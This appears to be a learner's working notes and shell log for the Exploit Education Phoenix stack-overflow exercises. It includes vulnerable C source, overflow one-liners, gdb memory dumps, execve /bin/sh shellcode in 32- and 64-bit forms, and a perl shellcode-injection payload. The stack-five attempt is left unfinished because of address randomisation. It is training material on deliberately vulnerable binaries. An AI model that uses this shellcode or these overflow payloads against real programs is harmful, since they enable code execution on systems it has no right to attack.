
https://exploit.education/phoenix/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}

user@phoenix:/opt/phoenix/amd64$ ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
foo
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
user@phoenix:/opt/phoenix/amd64$ for i in `seq 1 64`; do echo -n x; done; echo ""
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
user@phoenix:/opt/phoenix/amd64$ echo $(for i in $(seq 1 64); do echo -n x; done; echo 01) | ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!

user@phoenix:/opt/phoenix/amd64$ ./stack-one $(for i in $(seq 1 64); do echo -n x; done; echo -ne '\x49\x6C\x59\x62')
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
user@phoenix:/opt/phoenix/amd64$ ./stack-one $(for i in $(seq 1 64); do echo -n x; done; echo -ne '\x62\x59\x6C\x49')
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value

user@phoenix:/opt/phoenix/amd64$ ExploitEducation=$(for i in $(seq 1 64); do echo -n x; done; echo -ne '\x0A\x09\x0A\x0D') ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value


user@phoenix:/opt/phoenix/amd64$ objdump -d stack-three | grep -A4 complete_level
000000000040069d <complete_level>:
  40069d:	55                   	push   %rbp
  40069e:	48 89 e5             	mov    %rsp,%rbp
  4006a1:	bf 90 07 40 00       	mov    $0x400790,%edi
  4006a6:	e8 45 fe ff ff       	callq  4004f0 <puts@plt>
user@phoenix:/opt/phoenix/amd64$ echo -n $(for i in $(seq 1 64); do echo -n x; done; echo -ne '\x9D\x06\x40\x00\x00\x00\x00\x00') | ./stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
bash: warning: command substitution: ignored null byte in input
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!


user@phoenix:/opt/phoenix/amd64$ echo -n $(for i in $(seq 1 88); do echo -n x; done; echo -ne '\x1D\x06\x40\x00\x00\x00\x00\x00') | ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
bash: warning: command substitution: ignored null byte in input
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!


user@phoenix:/opt/phoenix/amd64$ printf "\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a"
Hello, World!
user@phoenix:/opt/phoenix/amd64$ vim ~/helloworld_shellcode.sh 
user@phoenix:/opt/phoenix/amd64$ cat ~/helloworld_shellcode.sh 
#!/bin/bash
echo -ne '\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x57';
user@phoenix:/opt/phoenix/amd64$ objdump -d stack-five | grep -A10 start_level | head -10
000000000040058d <start_level>:
  40058d:	55                   	push   %rbp
  40058e:	48 89 e5             	mov    %rsp,%rbp
  400591:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  400595:	48 8d 45 80          	lea    -0x80(%rbp),%rax
  400599:	48 89 c7             	mov    %rax,%rdi
  40059c:	e8 4f fe ff ff       	callq  4003f0 <gets@plt>
  4005a1:	90                   	nop
  4005a2:	c9                   	leaveq 
  4005a3:	c3                   	retq 

https://www.exploit-db.com/exploits/40131

user@phoenix:/opt/phoenix/amd64$ vim ~/execve_sh_shellcode.sh 
user@phoenix:/opt/phoenix/amd64$ cat ~/execve_sh_shellcode.sh 
#!/bin/bash
echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';

user@phoenix:/opt/phoenix/amd64$ gdb -q stack-five
Reading symbols from stack-five...
(No debugging symbols found in stack-five)
(gdb) break *0x400599
Breakpoint 1 at 0x400599
(gdb) run xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Starting program: /opt/phoenix/amd64/stack-five xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x0000000000400599 in start_level ()
(gdb) bt
#0  0x0000000000400599 in start_level ()
#1  0x00000000004005c7 in main ()
(gdb) disassemble
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   %rbp
   0x000000000040058e <+1>:	mov    %rsp,%rbp
   0x0000000000400591 <+4>:	add    $0xffffffffffffff80,%rsp
   0x0000000000400595 <+8>:	lea    -0x80(%rbp),%rax
=> 0x0000000000400599 <+12>:	mov    %rax,%rdi
   0x000000000040059c <+15>:	callq  0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leaveq 
   0x00000000004005a3 <+22>:	retq   
End of assembler dump.
(gdb) info registers
rax            0x7ffd2c09d020      140725342294048
rbx            0x7ffd2c09d118      140725342294296
rcx            0x781ba3170d07      132060095646983
rdx            0x0                 0
rsi            0x7ffd2c09cff0      140725342294000
rdi            0x4b                75
rbp            0x7ffd2c09d0a0      0x7ffd2c09d0a0
rsp            0x7ffd2c09d020      0x7ffd2c09d020
r8             0x781ba33b5300      132060098024192
r9             0x7ffd2c09d07f      140725342294143
r10            0x1                 1
r11            0x206               518
r12            0x7ffd2c09d130      140725342294320
r13            0x4005a4            4195748
r14            0x0                 0
r15            0x0                 0
rip            0x400599            0x400599 <start_level+12>
eflags         0x203               [ CF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) break *0x00000000004005a2
Breakpoint 2 at 0x4005a2
(gdb) continue
Continuing.


Breakpoint 2, 0x00000000004005a2 in start_level ()
(gdb) info registers
rax            0x7ffd2c09d020      140725342294048
rbx            0x7ffd2c09d118      140725342294296
rcx            0x8080808080808080  -9187201950435737472
rdx            0x7ffd2c09d07f      140725342294143
rsi            0xfefefefefefefeff  -72340172838076673
rdi            0x7ffd2c09d021      140725342294049
rbp            0x7ffd2c09d0a0      0x7ffd2c09d0a0
rsp            0x7ffd2c09d020      0x7ffd2c09d020
r8             0x7ffd2c09d020      140725342294048
r9             0x7ffd2c09d07f      140725342294143
r10            0x1                 1
r11            0x246               582
r12            0x7ffd2c09d130      140725342294320
r13            0x4005a4            4195748
r14            0x0                 0
r15            0x0                 0
rip            0x4005a2            0x4005a2 <start_level+21>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0

(gdb) disass start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   %rbp
   0x000000000040058e <+1>:	mov    %rsp,%rbp
   0x0000000000400591 <+4>:	add    $0xffffffffffffff80,%rsp
   0x0000000000400595 <+8>:	lea    -0x80(%rbp),%rax
   0x0000000000400599 <+12>:	mov    %rax,%rdi
   0x000000000040059c <+15>:	callq  0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leaveq 
   0x00000000004005a3 <+22>:	retq   
End of assembler dump.
(gdb) disass
No function contains program counter for selected frame.
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) Quit
(gdb) run xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/phoenix/amd64/stack-five xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x0000000000400599 in start_level ()
(gdb) continue
Continuing.
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Breakpoint 2, 0x00000000004005a2 in start_level ()
(gdb) x/12xw $rsp
0x7fff56883bc0:	0x78787878	0x78787878	0x78787878	0x78787878
0x7fff56883bd0:	0x78787878	0x78787878	0x78787878	0x78787878
0x7fff56883be0:	0x78787878	0x78787878	0x78787878	0x78787878

https://secgroup.dais.unive.it/teaching/security-course/overwriting-return-address/

user@phoenix:/opt/phoenix/amd64$ for i in `seq 1 127`; do echo -n x; done | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
user@phoenix:/opt/phoenix/amd64$ for i in `seq 1 128`; do echo -n x; done | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
user@phoenix:/opt/phoenix/amd64$ for i in `seq 1 127`; do echo -n x; done 
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/phoenix/amd64/stack-five xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x0000000000400599 in start_level ()
(gdb) continue
Continuing.
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Breakpoint 2, 0x00000000004005a2 in start_level ()
(gdb) x/20xw $rsp
0x7ffe8bc6a830:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a840:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a850:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a860:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a870:	0x78787878	0x78787878	0x78787878	0x78787878
(gdb) x/40xw $rsp
0x7ffe8bc6a830:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a840:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a850:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a860:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a870:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a880:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a890:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a8a0:	0x78787878	0x78787878	0x78787878	0x00787878
0x7ffe8bc6a8b0:	0x8bc6a800	0x00007ffe	0x004005c7	0x00000000
0x7ffe8bc6a8c0:	0x8bc6a928	0x00007ffe	0x00000000	0x00000002
(gdb) disass main
Dump of assembler code for function main:
   0x00000000004005a4 <+0>:	push   %rbp
   0x00000000004005a5 <+1>:	mov    %rsp,%rbp
   0x00000000004005a8 <+4>:	sub    $0x10,%rsp
   0x00000000004005ac <+8>:	mov    %edi,-0x4(%rbp)
   0x00000000004005af <+11>:	mov    %rsi,-0x10(%rbp)
   0x00000000004005b3 <+15>:	mov    $0x400620,%edi
   0x00000000004005b8 <+20>:	callq  0x400400 <puts@plt>
   0x00000000004005bd <+25>:	mov    $0x0,%eax
   0x00000000004005c2 <+30>:	callq  0x40058d <start_level>
   0x00000000004005c7 <+35>:	mov    $0x0,%eax
   0x00000000004005cc <+40>:	leaveq 
   0x00000000004005cd <+41>:	retq   
End of assembler dump.

So the return address is 0x004005c7
We need to add 8 more chars, plus the new return address.
But what address?

(gdb) x/40xw $rsp - 128
0x7ffe8bc6a7b0:	0x647a4200	0x000074d5	0x64560584	0x000074d5
0x7ffe8bc6a7c0:	0x00400200	0x00000000	0x647a55a7	0x000074d5
0x7ffe8bc6a7d0:	0x00400238	0x00000000	0x8bc6a830	0x00007ffe
0x7ffe8bc6a7e0:	0x8bc6a8b0	0x00007ffe	0x8bc6a940	0x00007ffe
0x7ffe8bc6a7f0:	0x004005a4	0x00000000	0x00000000	0x00000000
0x7ffe8bc6a800:	0x00000000	0x00000000	0x64561e4e	0x000074d5
0x7ffe8bc6a810:	0x8bc6a88f	0x00007ffe	0x8bc6a928	0x00007ffe
0x7ffe8bc6a820:	0x8bc6a8b0	0x00007ffe	0x004005a1	0x00000000
0x7ffe8bc6a830:	0x78787878	0x78787878	0x78787878	0x78787878
0x7ffe8bc6a840:	0x78787878	0x78787878	0x78787878	0x78787878

should be 0x7ffe8bc6a830
which means the last two words:

0x004005c7      0x00000000

should be overwritten with:

0x8bc6a830 0x00007ffe

Here is our shellcode:

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80

plus an extra NOP at the end to make an even 20 bytes:
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80\x90

That's 127 chars before the overflow, minus 20 bytes at the beginning for shellcode, plus 8 bytes before reaching the return code.

127-20+8
115

user@phoenix:/opt/phoenix/amd64$ perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80\x90" . "A"x115 . "\x30\xa8\xc6\x8b\xfe\x7f\x00\x00"' | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault

Ughhh, that was 32-bit god damn shellcode. Let's try this instead:

user@phoenix:~$ cat execve_sh_shellcode.c
/* https://www.exploit-db.com/shellcodes/46907 */
#include <stdio.h>

unsigned char shellcode[] = \
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
int main()
{
    int (*ret)() = (int(*)())shellcode;
    ret();
}
user@phoenix:~$ gcc -fno-stack-protector -z execstack execve_sh_shellcode.c && ./a.out
$ 

127-23+8
112

perl -e 'print "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05\x90" . "A"x111 . "\x30\xa8\xc6\x8b\xfe\x7f\x00\x00"' | ./stack-five

The address is very shifty.

(gdb) disass start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   %rbp
   0x000000000040058e <+1>:	mov    %rsp,%rbp
   0x0000000000400591 <+4>:	add    $0xffffffffffffff80,%rsp
   0x0000000000400595 <+8>:	lea    -0x80(%rbp),%rax
   0x0000000000400599 <+12>:	mov    %rax,%rdi
   0x000000000040059c <+15>:	callq  0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leaveq 
   0x00000000004005a3 <+22>:	retq   
End of assembler dump.
No symbol table is loaded.  Use the "file" command.
(gdb) break *0x00000000004005a1
Breakpoint 1 at 0x4005a1
(gdb) run
Starting program: /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x00000000004005a1 in start_level ()
(gdb) info reg
rax            0x7fffc25f5aa0      140736454417056
rbx            0x7fffc25f5b98      140736454417304
rcx            0x8080808080808080  -9187201950435737472
rdx            0x7fffc25f5aff      140736454417151
rsi            0xfefefefefefefeff  -72340172838076673
rdi            0x7fffc25f5b14      140736454417172
rbp            0x7fffc25f5b20      0x7fffc25f5b20
rsp            0x7fffc25f5aa0      0x7fffc25f5aa0
r8             0x7fffc25f5aa0      140736454417056
r9             0xa0a0a0a0a0a0a0a   723401728380766730
r10            0x8080808080808080  -9187201950435737472
r11            0x4                 4
r12            0x7fffc25f5ba8      140736454417320
r13            0x4005a4            4195748
r14            0x0                 0
r15            0x0                 0
rip            0x4005a1            0x4005a1 <start_level+20>
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/80xw $rsp - 64
0x7fffc25f5a60:	0x004005a4	0x00000000	0x00000000	0x00000000
0x7fffc25f5a70:	0x00000000	0x00000000	0x897e5e4e	0x0000753b
0x7fffc25f5a80:	0xc25f5aff	0x00007fff	0xc25f5b98	0x00007fff
0x7fffc25f5a90:	0xc25f5b20	0x00007fff	0x004005a1	0x00000000
0x7fffc25f5aa0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffc25f5ab0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffc25f5ac0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffc25f5ad0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffc25f5ae0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffc25f5af0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffc25f5b00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffc25f5b10:	0x00414141	0x00007f00	0xc25f5b40	0x00007fff
0x7fffc25f5b20:	0xc25f5b40	0x00007fff	0x004005c7	0x00000000
0x7fffc25f5b30:	0xc25f5b98	0x00007fff	0x00000000	0x00000001
0x7fffc25f5b40:	0x00000001	0x00000000	0x897bcd62	0x0000753b
0x7fffc25f5b50:	0x00000000	0x00000000	0xc25f5b90	0x00007fff
0x7fffc25f5b60:	0x00000000	0x00000000	0x89a2abc8	0x0000753b
0x7fffc25f5b70:	0x00003e00	0x04000001	0x00400459	0x00000000
0x7fffc25f5b80:	0x00000000	0x00000000	0x00400436	0x00000000
0x7fffc25f5b90:	0x00000001	0x00000000	0xc25f758a	0x00007fff

user@phoenix:/opt/phoenix/amd64$ gdb -q stack-five
Reading symbols from stack-five...
(No debugging symbols found in stack-five)
(gdb) disass start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   %rbp
   0x000000000040058e <+1>:	mov    %rsp,%rbp
   0x0000000000400591 <+4>:	add    $0xffffffffffffff80,%rsp
   0x0000000000400595 <+8>:	lea    -0x80(%rbp),%rax
   0x0000000000400599 <+12>:	mov    %rax,%rdi
   0x000000000040059c <+15>:	callq  0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leaveq 
   0x00000000004005a3 <+22>:	retq   
End of assembler dump.
(gdb) break *0x00000000004005a1
Breakpoint 1 at 0x4005a1
(gdb) run 
Starting program: /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x00000000004005a1 in start_level ()
(gdb) x/80xw $rsp - 64
0x7fffcae29420:	0x004005a4	0x00000000	0x00000000	0x00000000
0x7fffcae29430:	0x00000000	0x00000000	0x698d2e4e	0x00007b11
0x7fffcae29440:	0xcae294bf	0x00007fff	0xcae29558	0x00007fff
0x7fffcae29450:	0xcae294e0	0x00007fff	0x004005a1	0x00000000
0x7fffcae29460:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffcae29470:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffcae29480:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffcae29490:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffcae294a0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffcae294b0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffcae294c0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffcae294d0:	0x00004141	0x00007fff	0xcae29500	0x00007fff
0x7fffcae294e0:	0xcae29500	0x00007fff	0x004005c7	0x00000000
0x7fffcae294f0:	0xcae29558	0x00007fff	0x00000000	0x00000001
0x7fffcae29500:	0x00000001	0x00000000	0x698a9d62	0x00007b11
0x7fffcae29510:	0x00000000	0x00000000	0xcae29550	0x00007fff
0x7fffcae29520:	0x00000000	0x00000000	0x69b17bc8	0x00007b11
0x7fffcae29530:	0x00003e00	0x04000001	0x00400459	0x00000000
0x7fffcae29540:	0x00000000	0x00000000	0x00400436	0x00000000
0x7fffcae29550:	0x00000001	0x00000000	0xcae2b58a	0x00007fff

user@phoenix:~$ cat getenv_example.c 
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
	printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
user@phoenix:~$ gcc getenv_example.c 
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7fff2b2cd5d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffe1f9bf5d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffc8d2705d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffe31e625d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffcd3ed55d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffd1ea8a5d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffd3f1d35d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffd606255d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffdd869b5d0
user@phoenix:~$ FOO=xxxxxxxxx ./a.out FOO
FOO is at 0x7ffe6fb615d0

user@phoenix:~$ cat argv_address.c 
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
	printf("%s is at %p\n", "argv[1]", &argv[1]);
}
user@phoenix:~$ gcc argv_address.c 
user@phoenix:~$ ./a.out 
argv[1] is at 0x7ffffb72fc50
user@phoenix:~$ ./a.out 
argv[1] is at 0x7ffd5e4d0740
user@phoenix:~$ ./a.out 
argv[1] is at 0x7fff66a82660
user@phoenix:~$ ./a.out 
argv[1] is at 0x7ffcd91e3d10
user@phoenix:~$ ./a.out 
argv[1] is at 0x7fff1ff22e30
user@phoenix:~$ ./a.out 
argv[1] is at 0x7ffe8b9de580

Yeah... that variance is way too high to NOP sled.

